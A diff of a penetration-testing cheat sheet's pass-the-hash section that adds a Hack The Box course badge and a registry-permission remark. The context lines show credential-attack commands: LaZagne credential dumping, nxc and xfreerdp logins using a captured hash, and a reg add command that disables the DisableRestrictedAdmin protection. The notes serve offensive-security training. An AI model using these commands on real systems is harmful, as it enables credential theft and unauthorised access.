@@ -279,6 +279,7 @@ PS> .\LaZagne.exe all
 #### Pass-the-hash (pth)
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
+[![attacking_common_services](../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
 
 There are some scenarios in which we got hold of a hash, but haven't managed to crack it. We may try to use the hash.
 
@@ -293,7 +294,7 @@ $ nxc smb IP/32 -u username -d . -H hash
 $ xfreerdp  /v:IP /u:username /pth:hash
 ```
 
-⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`.
+⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` <small>(registry permission required)</small>.
 
 * We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.
 
